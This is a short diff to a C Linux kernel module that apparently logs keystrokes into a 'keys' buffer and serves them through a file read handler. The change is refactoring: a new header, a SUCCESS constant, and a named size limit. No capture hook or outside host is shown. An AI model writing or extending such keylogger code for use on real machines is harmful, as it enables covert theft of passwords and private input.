@@ -3,6 +3,7 @@
 #include <linux/uaccess.h>
 
 #include "fs.h"
+#include "keyp.h"
 
 char keys[MAX_PROC_SIZE];
 
@@ -34,13 +35,13 @@ kbd_fs_read(struct file *file, char __user *buf, size_t len, loff_t *offset)
         }
         return length;
     }
-    return 0;
+    return SUCCESS;
 }
 
-inline void append_to_keys(char *value)
+void append_to_keys(char *value)
 {
 	strncat(value, "\n", 2);
-	if (strlen(keys) > MAX_PROC_SIZE - 10)
+	if (strlen(keys) > MAX_PROC_SIZE - MIN_KEY_SIZE)
 		memset(keys, 0, sizeof(keys));
 	memcpy(&keys[strlen(keys)], value, strlen(value) + 1);
 }
